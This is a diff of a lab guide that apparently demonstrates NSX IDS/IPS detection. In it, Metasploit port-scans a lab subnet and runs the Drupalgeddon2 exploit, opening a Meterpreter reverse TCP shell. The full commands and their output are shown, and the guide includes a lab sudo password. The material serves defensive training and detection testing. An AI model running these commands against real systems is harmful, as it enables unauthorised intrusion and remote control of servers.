@@ -408,10 +408,28 @@ In this exercise, we will use **Metasploit** to launch a simple exploit against 
     * Type **set THREADS 50** 
     * Type **set RHOSTS 192.168.10.0/24** to define the subnets to scan. These should match the **DMZ** Subnet
     * Type **set PORTS 8080,5984** to define the ports to scan (Drupal and CouchDB servers)
-    * Type **run
+    * Type **run**
 
 ```console
-msf5 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/portscan/tcp
+vmware@ubuntu:~$sudo msfconsole
+
+IIIIII    dTb.dTb        _.---._
+  II     4'  v  'B   .'"".'/|\`.""'.
+  II     6.     .P  :  .' / | \ `.  :
+  II     'T;. .;P'  '.'  /  |  \  `.'
+  II      'T; ;P'    `. /   |   \ .'
+IIIIII     'YvP'       `-.__|__.-'
+
+I love shells --egypt
+
+
+       =[ metasploit v5.0.95-dev                          ]
++ -- --=[ 2038 exploits - 1103 auxiliary - 344 post       ]
++ -- --=[ 562 payloads - 45 encoders - 10 nops            ]
++ -- --=[ 7 evasion                                       ]
+
+Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it with setg RHOSTS x.x.x.x
+msf5 > use auxiliary/scanner/portscan/tcp
 msf5 auxiliary(scanner/portscan/tcp) > set THREADS 50
 THREADS => 50
 msf5 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.10.0/24
@@ -439,23 +457,39 @@ msf5 auxiliary(scanner/portscan/tcp) > run
 [*] Auxiliary module execution completed
 ```
 
-> **Note**: To reduce the number of OVAs needed, each workload VM deployed runs both a vulnerable **Drupal** and a vulnerable **CouchDB** service
+> **Note**: To reduce the number of OVAs needed for this PoV, each workload VM deployed runs both a vulnerable **Drupal** and a vulnerable **CouchDB** service
 
 **Initiate DrupalGeddon2 attack against App1-WEB-TIER VM**
-1. In order to launch the **Drupalgeddon2** exploit against the **App1-WEB-TIER VM**, you can either manually configure the **Metasploit** module, or edit and run a pre-defined script. 
-    * If you want to run the attack manually, skip to step #5. 
-    * If you want to go with the script option, run **sudo nano attack1.rc** and type **VMware1!** when asked for the password. 
-    * Confirm that the **RHOST** line IP address matches with the IP address of **App1-WEB-TIER VM** you saw in the NSX VM Inventory. 
-    * Change this IP address if needed. 
-    * Save your changes and exit **nano**
-2. Type **sudo ./attack1.sh** to initiate the Metasploit script and Drupalgeddon exploit. Next, go to step #6
-3.  **Alternatively**, to run the attack manually, type **sudo msfconsole** to launch **Metasploit**. Follow the below steps to initiate the exploit. Hit **enter** between every step. 
+In order to launch the **Drupalgeddon2** exploit against the **App1-WEB-TIER VM**, you can either manually configure the **Metasploit** module, or edit and run a pre-defined script. If you want to go with the script option, skip to step #3 and continue from there. 
+
+1. To initiate the attack manually, use the Metasploit console you opened earlier. Follow the below steps to initiate the exploit. Hit **enter** between every step. 
     * Type **use exploit/unix/webapp/drupal_drupalgeddon2** to select the drupalgeddon2 exploit module
     * Type **set RHOST 192.168.10.101** to define the IP address of the victim to attack. The IP address should match the IP address of **App1-WEB-TIER VM**
     * Type **set RPORT 8080** to define the port the vulnerable Drupal service runs on. 
     * Type **exploit** to initiate the exploit attempt
+2. Skip step #3 and #4, and continue with step #5
+
+```console
+
+msf5 auxiliary(scanner/portscan/tcp) > use exploit/unix/webapp/drupal_drupalgeddon2
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOST 192.168.10.101
+RHOST => 192.168.10.101
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) > set RPORT 8080
+RPORT => 8080
+msf5 exploit(unix/webapp/drupal_drupalgeddon2) > exploit
+[*] Started reverse TCP handler on 10.114.209.151:4444
+[*] Sending stage (38288 bytes) to 192.168.10.101
+[*] Meterpreter session 1 opened (10.114.209.151:4444 -> 192.168.10.101:45032) at 2020-07-20 19:37:29 -0500
+
+```
+3. If you want to go with the script option instead, run **sudo nano attack1.rc** and type **VMware1!** when asked for the password. 
+    * Confirm that the **RHOST** line IP address matches with the IP address of **App1-WEB-TIER VM** you saw in the NSX VM Inventory. 
+    * Change this IP address if needed. 
+    * Save your changes and exit **nano**
+4. Type **sudo ./attack1.sh** to initiate the Metasploit script and Drupalgeddon exploit. Next, go to step #6
     
-4. Confirm the vulnerable server was sucessfully exploited and a **Meterpreter** reverse TCP session was established from **App1-WEB-TIER VM** back to the **Extermal VM**
+5. Confirm the vulnerable server was sucessfully exploited and a **Meterpreter** reverse TCP session was established from **App1-WEB-TIER VM** back to the **Extermal VM**
 
 ```console
 vmware@ubuntu:~$ ./attack1.sh
@@ -486,12 +520,11 @@ resource (attack1.rc)> set RPORT 8080
 RPORT => 8080
 resource (attack1.rc)> exploit
 [*] Started reverse TCP handler on 10.114.209.151:4444
-[*] Sending stage (38288 bytes) to 192.168.10.100
-[*] Meterpreter session 1 opened (10.114.209.151:4444 -> 192.168.10.100:45032) at 2020-07-20 19:37:29 -0500
+[*] Sending stage (38288 bytes) to 192.168.10.101
+[*] Meterpreter session 1 opened (10.114.209.151:4444 -> 192.168.10.101:45032) at 2020-07-20 19:37:29 -0500
 
 ```
-
-4. **Optionally**, you can now interact with the Meterpreter session. For instance, you can run the below commands to gain more inforation on the exploited **App1-WEB-TIER VM**
+6. **Optionally**, you can now interact with the Meterpreter session. For instance, you can run the below commands to gain more inforation on the exploited **App1-WEB-TIER VM**
     * Type **sysinfo** to learn more about the running OS
 
 ```console
@@ -507,7 +540,7 @@ meterpreter > ?
 
 > **Note**: Do not fatally damage the exploited VM at this point, as we will be using it again in other exercises. Do not close the Meterpreter session as we will use this existing session to move our attack in the next exercise.
 
-8. When you are done exploiting, type exit -z to shut down Meterpreter
+7. When you are done exploiting, type exit -z to shut down Meterpreter
 
 **Confirm IDS/IPS Events show up in the NSX Manager UI**
 1.	In the NSX Manager UI, navigate to Security -->  Security Overview
